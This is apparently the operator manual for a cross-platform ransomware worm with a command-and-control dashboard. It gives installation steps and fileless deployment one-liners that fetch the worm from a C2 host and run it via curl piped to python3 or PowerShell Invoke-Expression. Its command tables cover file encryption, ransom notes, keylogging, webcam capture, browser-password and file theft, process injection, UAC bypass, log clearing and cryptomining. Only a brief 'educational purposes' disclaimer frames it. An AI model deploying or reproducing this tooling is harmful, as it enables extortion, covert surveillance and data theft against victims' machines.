Cross-Platform Ransomware Worm with C2 Server
=============================================

Complete Command and Control System Documentation
-------------------------------------------------

Table of Contents
-----------------

1.  Overview
    
2.  Features
    
3.  System Architecture
    
4.  Installation Guide
    
    *   C2 Server Installation
        
    *   Worm Deployment
        
5.  C2 Server Commands
    
    *   Encryption Commands
        
    *   Keylogger Commands
        
    *   Webcam Commands
        
    *   System Commands
        
    *   Data Exfiltration Commands
        
    *   Persistence Commands
        
    *   Ransomware Commands
        
    *   Miscellaneous Commands
        
6.  API Reference
    
7.  Troubleshooting
    
8.  Security Considerations
    

Overview
--------

This is a complete cross-platform Command and Control (C2) system consisting of:

*   C2 Server: A web-based dashboard for controlling infected machines
    
*   Worm Malware: Cross-platform agent that executes commands on Windows, macOS, and Linux
    

The system provides remote control capabilities including:

*   File encryption and decryption
    
*   Keystroke logging
    
*   Webcam access
    
*   Screenshot capture
    
*   Data exfiltration
    
*   Cryptocurrency mining
    
*   System command execution
    
*   Process injection
    
*   And much more
    

Features
--------

### Worm Features

*   Cross-Platform: Works on Windows, macOS, and Linux
    
*   Anti-VM Detection: Detects virtual machines and sandboxes
    
*   Persistent: Multiple persistence mechanisms
    
*   Stealth: Clears logs, bypasses UAC
    
*   Encryption: AES-256 file encryption
    
*   Keylogging: Captures all keystrokes
    
*   Webcam: Capture images and stream
    
*   Data Exfiltration: Steals sensitive files
    
*   Crypto Mining: Fallback cryptocurrency mining
    
*   Process Injection: Injects code into running processes
    
*   Dead Man's Switch: Automatic encryption if no C2 contact
    
*   Checkpoint Resume: Resumes encryption if interrupted
    

### C2 Server Features

*   Web Dashboard: Real-time host monitoring
    
*   WebSocket Support: Live updates
    
*   Command Templates: Pre-built command structures
    
*   Keylog Viewer: View captured keystrokes
    
*   Host Statistics: Detailed system information
    
*   Multi-Host: Control multiple infected machines
    
*   API Access: RESTful API for automation
    
*   Secure Login: Password-protected access
    

System Architecture
-------------------

text

Plain textANTLR4BashCC#CSSCoffeeScriptCMakeDartDjangoDockerEJSErlangGitGoGraphQLGroovyHTMLJavaJavaScriptJSONJSXKotlinLaTeXLessLuaMakefileMarkdownMATLABMarkupObjective-CPerlPHPPowerShell.propertiesProtocol BuffersPythonRRubySass (Sass)Sass (Scss)SchemeSQLShellSwiftSVGTSXTypeScriptWebAssemblyYAMLXML`   +-------------------------------------------------------------+  |                      C2 SERVER                              |  |                   (Your Computer)                           |  |                                                             |  |  +---------------+  +---------------+  +----------------+   |  |  |  Web Dashboard |  |  WebSocket    |  |  REST API    |   |  |  |  (Port 5000)   |  |  (Real-time)  |  |  (HTTP)      |   |  |  +---------------+  +---------------+  +----------------+   |  |                                                             |  |  +-----------------------------------------------------+   |  |  |               SQLite Database                        |   |  |  |  (Hosts, Commands, Keylogs, Encrypted Files)        |   |  |  +-----------------------------------------------------+   |  +-------------------------------------------------------------+                             |                      DNS/HTTP Beacons                             |          +------------------+------------------+          |                  |                  |  +-------+-------+  +-------+-------+  +-------+-------+  |  Windows     |  |  macOS         |  |  Linux       |  |  Worm Agent  |  |  Worm Agent    |  |  Worm Agent  |  +--------------+  +---------------+  +---------------+   `

Installation Guide
------------------

### C2 Server Installation

#### Option 1: Quick Install (All Operating Systems)

bash

Plain textANTLR4BashCC#CSSCoffeeScriptCMakeDartDjangoDockerEJSErlangGitGoGraphQLGroovyHTMLJavaJavaScriptJSONJSXKotlinLaTeXLessLuaMakefileMarkdownMATLABMarkupObjective-CPerlPHPPowerShell.propertiesProtocol BuffersPythonRRubySass (Sass)Sass (Scss)SchemeSQLShellSwiftSVGTSXTypeScriptWebAssemblyYAMLXML`   # 1. Clone or download the c2_server.py file  # 2. Install Python dependencies  pip install Flask==2.3.2 Flask-SocketIO==5.3.4 python-socketio==5.8.0 eventlet==0.33.3  # 3. Run the server  python c2_server.py   `

#### Option 2: Detailed Installation by Operating System

Windows Installation

powershell

Plain textANTLR4BashCC#CSSCoffeeScriptCMakeDartDjangoDockerEJSErlangGitGoGraphQLGroovyHTMLJavaJavaScriptJSONJSXKotlinLaTeXLessLuaMakefileMarkdownMATLABMarkupObjective-CPerlPHPPowerShell.propertiesProtocol BuffersPythonRRubySass (Sass)Sass (Scss)SchemeSQLShellSwiftSVGTSXTypeScriptWebAssemblyYAMLXML`   # 1. Install Python (if not installed)  # Download from: https://www.python.org/downloads/  # 2. Open Command Prompt as Administrator  # 3. Install dependencies  python -m pip install Flask==2.3.2 Flask-SocketIO==5.3.4 python-socketio==5.8.0 eventlet==0.33.3  # 4. Allow firewall access  # Windows will prompt to allow Python access - click "Allow"  # 5. Run the server  python c2_server.py  # 6. Access the dashboard  # Open browser: http://localhost:5000   `

macOS Installation

bash

Plain textANTLR4BashCC#CSSCoffeeScriptCMakeDartDjangoDockerEJSErlangGitGoGraphQLGroovyHTMLJavaJavaScriptJSONJSXKotlinLaTeXLessLuaMakefileMarkdownMATLABMarkupObjective-CPerlPHPPowerShell.propertiesProtocol BuffersPythonRRubySass (Sass)Sass (Scss)SchemeSQLShellSwiftSVGTSXTypeScriptWebAssemblyYAMLXML`   # 1. Install Homebrew (if not installed)  /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"  # 2. Install Python and Tkinter  brew install python3 python-tk  # 3. Install dependencies  pip3 install Flask==2.3.2 Flask-SocketIO==5.3.4 python-socketio==5.8.0 eventlet==0.33.3  # 4. Allow incoming connections  # System Preferences > Security & Privacy > Firewall > Allow Python  # 5. Run the server  python3 c2_server.py  # 6. Access the dashboard  # Open browser: http://localhost:5000   `

Linux Installation

bash

Plain textANTLR4BashCC#CSSCoffeeScriptCMakeDartDjangoDockerEJSErlangGitGoGraphQLGroovyHTMLJavaJavaScriptJSONJSXKotlinLaTeXLessLuaMakefileMarkdownMATLABMarkupObjective-CPerlPHPPowerShell.propertiesProtocol BuffersPythonRRubySass (Sass)Sass (Scss)SchemeSQLShellSwiftSVGTSXTypeScriptWebAssemblyYAMLXML`   # 1. Install Python and pip  sudo apt update  sudo apt install python3 python3-pip python3-tk -y  # Ubuntu/Debian  # OR  sudo yum install python3 python3-pip -y  # CentOS/RHEL  # 2. Install dependencies  pip3 install Flask==2.3.2 Flask-SocketIO==5.3.4 python-socketio==5.8.0 eventlet==0.33.3  # 3. Allow firewall access (if enabled)  sudo ufw allow 5000  # Ubuntu/Debian  # OR  sudo firewall-cmd --add-port=5000/tcp --permanent  # CentOS/RHEL  # 4. Run the server  python3 c2_server.py  # 5. Access the dashboard  # Open browser: http://your-ip:5000   `

#### Initial Server Configuration

After starting the server, you'll see:

text

Plain textANTLR4BashCC#CSSCoffeeScriptCMakeDartDjangoDockerEJSErlangGitGoGraphQLGroovyHTMLJavaJavaScriptJSONJSXKotlinLaTeXLessLuaMakefileMarkdownMATLABMarkupObjective-CPerlPHPPowerShell.propertiesProtocol BuffersPythonRRubySass (Sass)Sass (Scss)SchemeSQLShellSwiftSVGTSXTypeScriptWebAssemblyYAMLXML`   ============================================================  C2 SERVER v2.0  ============================================================  Server URL: http://0.0.0.0:5000  Username: admin  Password: secure_password_123  ============================================================  Waiting for connections...  ============================================================   `

IMPORTANT: Change the default password by editing the ADMIN\_PASSWORD variable in the code!

### Worm Deployment

#### Configuring the Worm

Edit the worm code to point to your C2 server:

python

Plain textANTLR4BashCC#CSSCoffeeScriptCMakeDartDjangoDockerEJSErlangGitGoGraphQLGroovyHTMLJavaJavaScriptJSONJSXKotlinLaTeXLessLuaMakefileMarkdownMATLABMarkupObjective-CPerlPHPPowerShell.propertiesProtocol BuffersPythonRRubySass (Sass)Sass (Scss)SchemeSQLShellSwiftSVGTSXTypeScriptWebAssemblyYAMLXML`   # In the worm code, change this line:  C2_SERVER = 'your-ip-address-or-domain.com'  # e.g., '192.168.1.100'   `

#### Deployment Methods

bash

Plain textANTLR4BashCC#CSSCoffeeScriptCMakeDartDjangoDockerEJSErlangGitGoGraphQLGroovyHTMLJavaJavaScriptJSONJSXKotlinLaTeXLessLuaMakefileMarkdownMATLABMarkupObjective-CPerlPHPPowerShell.propertiesProtocol BuffersPythonRRubySass (Sass)Sass (Scss)SchemeSQLShellSwiftSVGTSXTypeScriptWebAssemblyYAMLXML`   # Method 1: Direct execution  python3 worm.py  # Method 2: Fileless execution (download and run)  curl -s http://your-c2-server/worm.py | python3  # Method 3: PowerShell (Windows)  powershell -command "Invoke-Expression (Invoke-WebRequest -Uri 'http://your-c2-server/worm.py').Content"  # Method 4: As a service (persistence)  # The worm automatically installs persistence on first run   `

C2 Server Commands
------------------

### Command Structure

All commands are sent via the web dashboard with this JSON structure:

json

Plain textANTLR4BashCC#CSSCoffeeScriptCMakeDartDjangoDockerEJSErlangGitGoGraphQLGroovyHTMLJavaJavaScriptJSONJSXKotlinLaTeXLessLuaMakefileMarkdownMATLABMarkupObjective-CPerlPHPPowerShell.propertiesProtocol BuffersPythonRRubySass (Sass)Sass (Scss)SchemeSQLShellSwiftSVGTSXTypeScriptWebAssemblyYAMLXML`   {    "host_id": "target-host-id",    "command": "command_name",    "params": {      "param1": "value1",      "param2": "value2"    }  }   `

### Encryption Commands

CommandDescriptionParametersExampleencryptEncrypt all filespassword: Encryption password{"password": "mysecret"}encrypt\_filesEncrypt specific filesfile\_paths: Array of paths, password: Password{"file\_paths": \["/path/file.txt"\], "password": "pass"}encrypt\_directoryEncrypt a directorydirectory: Path, password: Password, recursive: true/false{"directory": "/home/user/docs", "password": "pass"}decryptDecrypt all filespassword: Decryption password{"password": "mysecret"}decrypt\_filesDecrypt specific filesfile\_paths: Array of encrypted paths, password: Password{"file\_paths": \["/path/file.txt.enc"\], "password": "pass"}decrypt\_directoryDecrypt a directorydirectory: Path, password: Password, recursive: true/false{"directory": "/home/user/docs", "password": "pass"}encryption\_statusCheck encryption statusNone{}encryption\_statsGet encryption statisticsNone{}

### Keylogger Commands

CommandDescriptionParametersExamplekeylog\_startStart capturing keystrokesduration: Seconds to run (optional){"duration": 60}keylog\_stopStop capturing keystrokesNone{}keylog\_statusCheck keylogger statusNone{}keylog\_downloadDownload captured keystrokeslimit: Number of entries{"limit": 100}keylog\_clearClear captured keystrokesNone{}

### Webcam Commands

CommandDescriptionParametersExamplewebcam\_captureCapture a single frameNone{}webcam\_streamStream webcam videoduration: Seconds, frame\_rate: FPS{"duration": 10, "frame\_rate": 5}webcam\_statusCheck webcam statusNone{}webcam\_releaseRelease webcam resourcesNone{}

### System Commands

CommandDescriptionParametersExampleexecuteRun system commandcommand: Command to execute{"command": "whoami"}screenshotTake screenshotNone{}screen\_shareShare screen (one frame)None{}block\_computerLock/block computeraction: "lock"{"action": "lock"}list\_processesList running processesNone{}kill\_processKill a processpid: Process ID{"pid": 1234}inject\_processInject code into processpid: Process ID, shellcode: (optional){"pid": 1234}

### Data Exfiltration Commands

CommandDescriptionParametersExampleexfiltrateSteal files from systemmax\_files: Maximum files to steal{"max\_files": 50}steal\_browserSteal browser passwords/cookiesNone{}download\_fileDownload a file from victimremote\_path: Path to file{"remote\_path": "/etc/passwd"}upload\_fileUpload a file to victimlocal\_path: Source path, remote\_path: Destination path{"local\_path": "file.txt", "remote\_path": "/tmp/file.txt"}collect\_dataCollect system informationtype: "system\_info" or "file\_list"{"type": "system\_info"}file\_searchSearch for filespattern: Search pattern, path: Directory to search{"pattern": "\*.docx", "path": "/home"}directory\_listList directory contentspath: Directory path{"path": "/home"}

### Persistence Commands

CommandDescriptionParametersExampleinstall\_persistenceInstall multiple persistence methodsNone{}persistence\_statusCheck persistence statusNone{}

### Ransomware Commands

CommandDescriptionParametersExampledisplay\_ransom\_noteDisplay ransom note on victimNone{}change\_ransom\_amountChange ransom amountamount: New amount{"amount": "1.0"}change\_payment\_addressChange payment addressaddress: New BTC address{"address": "1A1zP1e..."}deadlineSet payment deadlinedays: Number of days{"days": 7}

### Mining Commands

CommandDescriptionParametersExamplestart\_miningStart cryptocurrency miningwallet\_address: Wallet address{"wallet\_address": "49cpNt..."}stop\_miningStop cryptocurrency miningNone{}mining\_statusCheck mining statusNone{}

### Miscellaneous Commands

CommandDescriptionParametersExamplestatusGet worm statusNone{}heartbeatSend heartbeatNone{}get\_os\_infoGet OS informationNone{}get\_statsGet all statisticsNone{}clear\_logsClear system logsNone{}bypass\_uacBypass Windows UACNone{}check\_environmentCheck for VM/sandboxNone{}self\_destructSelf destructconfirm: true{"confirm": true}

API Reference
-------------

### REST API Endpoints

EndpointMethodDescriptionAuthentication/api/hostsGETList all hostsRequired/api/host/GETGet host detailsRequired/api/commandPOSTSend command to hostRequired/api/beaconPOSTReceive beacon from hostNot Required/api/command\_resultPOSTReceive command resultNot Required/api/keylogs/GETGet keylogs for hostRequired/api/encrypted\_files/GETGet encrypted files listRequired/api/statsGETGet system statisticsRequired/api/command\_templatesGETGet command templatesRequired/api/clear\_logsPOSTClear all logsRequired

### API Usage Examples

Send Command via API:

bash

Plain textANTLR4BashCC#CSSCoffeeScriptCMakeDartDjangoDockerEJSErlangGitGoGraphQLGroovyHTMLJavaJavaScriptJSONJSXKotlinLaTeXLessLuaMakefileMarkdownMATLABMarkupObjective-CPerlPHPPowerShell.propertiesProtocol BuffersPythonRRubySass (Sass)Sass (Scss)SchemeSQLShellSwiftSVGTSXTypeScriptWebAssemblyYAMLXML`   curl -X POST http://localhost:5000/api/command \    -H "Content-Type: application/json" \    -d '{      "host_id": "host-uuid-here",      "command": "execute",      "params": {"command": "whoami"}    }'   `

Get Keylogs:

bash

Plain textANTLR4BashCC#CSSCoffeeScriptCMakeDartDjangoDockerEJSErlangGitGoGraphQLGroovyHTMLJavaJavaScriptJSONJSXKotlinLaTeXLessLuaMakefileMarkdownMATLABMarkupObjective-CPerlPHPPowerShell.propertiesProtocol BuffersPythonRRubySass (Sass)Sass (Scss)SchemeSQLShellSwiftSVGTSXTypeScriptWebAssemblyYAMLXML`   curl http://localhost:5000/api/keylogs/host-uuid-here   `

Get Statistics:

bash

Plain textANTLR4BashCC#CSSCoffeeScriptCMakeDartDjangoDockerEJSErlangGitGoGraphQLGroovyHTMLJavaJavaScriptJSONJSXKotlinLaTeXLessLuaMakefileMarkdownMATLABMarkupObjective-CPerlPHPPowerShell.propertiesProtocol BuffersPythonRRubySass (Sass)Sass (Scss)SchemeSQLShellSwiftSVGTSXTypeScriptWebAssemblyYAMLXML`   curl http://localhost:5000/api/stats   `

### WebSocket Events

EventDirectionDescriptionconnectClient to ServerEstablish WebSocket connectiondisconnectClient to ServerClose WebSocket connectionbeaconServer to ClientNew beacon receivedcommand\_resultServer to ClientCommand result receivedget\_hostsClient to ServerRequest hosts listsend\_commandClient to ServerSend command via WebSockethostsServer to ClientHosts list response

Troubleshooting
---------------

### Common Issues and Solutions

Server Won't Start (Port in use)

bash

Plain textANTLR4BashCC#CSSCoffeeScriptCMakeDartDjangoDockerEJSErlangGitGoGraphQLGroovyHTMLJavaJavaScriptJSONJSXKotlinLaTeXLessLuaMakefileMarkdownMATLABMarkupObjective-CPerlPHPPowerShell.propertiesProtocol BuffersPythonRRubySass (Sass)Sass (Scss)SchemeSQLShellSwiftSVGTSXTypeScriptWebAssemblyYAMLXML`   # Find process using port 5000  # Windows:  netstat -ano | findstr :5000  taskkill /PID  /F  # Linux/macOS:  lsof -i :5000  kill -9   # Or change port in C2_HOST and C2_PORT variables   `

Worm Not Connecting

bash

Plain textANTLR4BashCC#CSSCoffeeScriptCMakeDartDjangoDockerEJSErlangGitGoGraphQLGroovyHTMLJavaJavaScriptJSONJSXKotlinLaTeXLessLuaMakefileMarkdownMATLABMarkupObjective-CPerlPHPPowerShell.propertiesProtocol BuffersPythonRRubySass (Sass)Sass (Scss)SchemeSQLShellSwiftSVGTSXTypeScriptWebAssemblyYAMLXML`   # 1. Verify C2_SERVER in worm code  # 2. Check firewall allows port 5000  # 3. Test connection:  curl http://your-server-ip:5000/api/hosts  # 4. Check server logs for incoming beacons   `

Keylogger Not Working

bash

Plain textANTLR4BashCC#CSSCoffeeScriptCMakeDartDjangoDockerEJSErlangGitGoGraphQLGroovyHTMLJavaJavaScriptJSONJSXKotlinLaTeXLessLuaMakefileMarkdownMATLABMarkupObjective-CPerlPHPPowerShell.propertiesProtocol BuffersPythonRRubySass (Sass)Sass (Scss)SchemeSQLShellSwiftSVGTSXTypeScriptWebAssemblyYAMLXML`   # Windows: Run as Administrator  # macOS: Grant Accessibility and Input Monitoring permissions  # Linux: Run with sudo or add user to input group  sudo usermod -a -G input $USER   `

Webcam Not Working

bash

Plain textANTLR4BashCC#CSSCoffeeScriptCMakeDartDjangoDockerEJSErlangGitGoGraphQLGroovyHTMLJavaJavaScriptJSONJSXKotlinLaTeXLessLuaMakefileMarkdownMATLABMarkupObjective-CPerlPHPPowerShell.propertiesProtocol BuffersPythonRRubySass (Sass)Sass (Scss)SchemeSQLShellSwiftSVGTSXTypeScriptWebAssemblyYAMLXML`   # Install OpenCV:  pip install opencv-python opencv-python-headless  # macOS: Grant Camera permissions  # Linux: Install video4linux  sudo apt-get install v4l-utils   `

Security Considerations
-----------------------

### Important Security Notes

1.  pythonADMIN\_PASSWORD = 'your-strong-password-here' # Change this!
    
2.  python# Add SSL certificatesocketio.run(app, host='0.0.0.0', port=5000, ssl\_context=('cert.pem', 'key.pem'))
    
3.  python# Only allow specific IPsALLOWED\_IPS = \['192.168.1.100', '10.0.0.5'\]
    
4.  pythonC2\_DOMAIN = 'your-actual-domain.com' # Use real domain
    
5.  bash# Backup databasecp c2\_database.db c2\_database\_backup\_$(date +%Y%m%d).db
    

Command Examples
----------------

### Complete Workflow Example

1.  Start Server
    

bash

Plain textANTLR4BashCC#CSSCoffeeScriptCMakeDartDjangoDockerEJSErlangGitGoGraphQLGroovyHTMLJavaJavaScriptJSONJSXKotlinLaTeXLessLuaMakefileMarkdownMATLABMarkupObjective-CPerlPHPPowerShell.propertiesProtocol BuffersPythonRRubySass (Sass)Sass (Scss)SchemeSQLShellSwiftSVGTSXTypeScriptWebAssemblyYAMLXML`   python c2_server.py   `

1.  Deploy Worm
    

bash

Plain textANTLR4BashCC#CSSCoffeeScriptCMakeDartDjangoDockerEJSErlangGitGoGraphQLGroovyHTMLJavaJavaScriptJSONJSXKotlinLaTeXLessLuaMakefileMarkdownMATLABMarkupObjective-CPerlPHPPowerShell.propertiesProtocol BuffersPythonRRubySass (Sass)Sass (Scss)SchemeSQLShellSwiftSVGTSXTypeScriptWebAssemblyYAMLXML`   # On target machine  python3 worm.py   `

1.  Access Dashboard
    

*   Open [http://localhost:5000](http://localhost:5000/)
    
*   Login: admin / secure\_password\_123
    

1.  Check Connected Hosts
    

*   View dashboard for online hosts
    

1.  Send Commands
    

json

Plain textANTLR4BashCC#CSSCoffeeScriptCMakeDartDjangoDockerEJSErlangGitGoGraphQLGroovyHTMLJavaJavaScriptJSONJSXKotlinLaTeXLessLuaMakefileMarkdownMATLABMarkupObjective-CPerlPHPPowerShell.propertiesProtocol BuffersPythonRRubySass (Sass)Sass (Scss)SchemeSQLShellSwiftSVGTSXTypeScriptWebAssemblyYAMLXML`   {    "host_id": "a1b2c3d4-e5f6-7890-abcd-ef1234567890",    "command": "keylog_start",    "params": {      "duration": 60    }  }   `

1.  View Results
    

*   Keylogs appear in host detail view
    
*   Command results shown in real-time
    

File Structure
--------------

text

Plain textANTLR4BashCC#CSSCoffeeScriptCMakeDartDjangoDockerEJSErlangGitGoGraphQLGroovyHTMLJavaJavaScriptJSONJSXKotlinLaTeXLessLuaMakefileMarkdownMATLABMarkupObjective-CPerlPHPPowerShell.propertiesProtocol BuffersPythonRRubySass (Sass)Sass (Scss)SchemeSQLShellSwiftSVGTSXTypeScriptWebAssemblyYAMLXML`   c2_server/  ├── c2_server.py          # Main C2 server  ├── c2_database.db        # SQLite database  ├── c2_server.log         # Server logs  └── requirements.txt      # Python dependencies  worm/  ├── worm.py               # Main worm code  ├── worm_debug.log        # Worm debug logs  └── ~/.system_update/     # Hidden directory for worm files   `

Update Process
--------------

### Updating the Worm

1.  Modify worm.py with new features
    
2.  Deploy to C2 server
    
3.  Send self\_update command to victims
    

### Updating the C2 Server

1.  Backup database: cp c2\_database.db c2\_database\_backup.db
    
2.  Replace c2\_server.py with new version
    
3.  Restart server: python c2\_server.py
    

Support
-------

### Log Files

*   C2 Server Logs: c2\_server.log
    
*   Worm Debug Logs: worm\_debug.log (on victim machine)
    
*   Database: c2\_database.db (C2 server only)
    

### Debug Mode

bash

Plain textANTLR4BashCC#CSSCoffeeScriptCMakeDartDjangoDockerEJSErlangGitGoGraphQLGroovyHTMLJavaJavaScriptJSONJSXKotlinLaTeXLessLuaMakefileMarkdownMATLABMarkupObjective-CPerlPHPPowerShell.propertiesProtocol BuffersPythonRRubySass (Sass)Sass (Scss)SchemeSQLShellSwiftSVGTSXTypeScriptWebAssemblyYAMLXML`   # Run worm in debug mode  python3 worm.py --debug  # Check C2 server logs  tail -f c2_server.log   `

Disclaimer
----------

This software is for educational and security research purposes only.

*   Do not use on systems you do not own or have explicit permission to test
    
*   The author is not responsible for any misuse or damage caused
    
*   Always follow applicable laws and regulations
    

License
-------

This project is for educational purposes only.

Quick Reference Card
--------------------

WhatWhereHowC2 Server[http://localhost:5000](http://localhost:5000/)Login with admin credentialsWormTarget machineAuto-connects to C2CommandsDashboard or APIJSON formattedDatabasec2\_database.dbSQLiteLogsc2\_server.logText file
